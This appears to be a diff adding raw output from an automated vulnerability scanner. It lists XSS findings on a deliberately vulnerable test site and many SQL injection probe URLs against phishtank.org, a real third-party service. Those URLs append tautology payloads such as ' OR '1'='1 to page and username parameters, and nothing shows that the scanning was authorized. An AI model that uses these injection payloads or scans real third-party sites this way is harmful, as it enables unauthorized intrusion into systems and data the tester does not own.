@@ -1,0 +1,87 @@
+[XSS] http://testphp.vulnweb.com/userinfo.php
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/guestbook.php
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/userinfo.php
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[XSS] http://testphp.vulnweb.com/search.php?test=query
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199396' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199396' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199396" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=verifrom' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=verifrom' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=verifrom" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199409' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199409' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199409" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199394' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199394' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199394" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199395' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199395' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199395" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=tuanphuong' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=tuanphuong' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=tuanphuong" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199401' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199401' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199401" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199412' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199412' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199412" OR "1"="1
+[SQLi] https://phishtank.org/login.php?displayform=true' OR '1'='1
+[SQLi] https://phishtank.org/login.php?displayform=true' OR 'a'='a
+[SQLi] https://phishtank.org/login.php?displayform=true" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199392' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199392' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199392" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199398' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199398' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199398" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199407' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199407' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199407" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199404' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199404' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199404" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=DDay' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=DDay' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=DDay" OR "1"="1
+[SQLi] https://phishtank.org/phish_search.php?verified=u&active=y' OR '1'='1
+[SQLi] https://phishtank.org/phish_search.php?verified=u&active=y' OR 'a'='a
+[SQLi] https://phishtank.org/phish_search.php?verified=u&active=y" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199393' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199393' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199393" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199411' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199411' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199411" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=r3gersec' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=r3gersec' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=r3gersec" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199400' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199400' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199400" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=Citizenfour' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=Citizenfour' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=Citizenfour" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199406' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199406' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199406" OR "1"="1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199397' OR '1'='1
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199397' OR 'a'='a
+[SQLi] https://phishtank.org/phish_detail.php?phish_id=9199397" OR "1"="1
+[SQLi] https://phishtank.org?utm_source=chatgpt.com' OR '1'='1
+[SQLi] https://phishtank.org?utm_source=chatgpt.com' OR 'a'='a
+[SQLi] https://phishtank.org?utm_source=chatgpt.com" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=garbage' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=garbage' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=garbage" OR "1"="1
+[SQLi] https://phishtank.org/user.php?username=nbapphish' OR '1'='1
+[SQLi] https://phishtank.org/user.php?username=nbapphish' OR 'a'='a
+[SQLi] https://phishtank.org/user.php?username=nbapphish" OR "1"="1
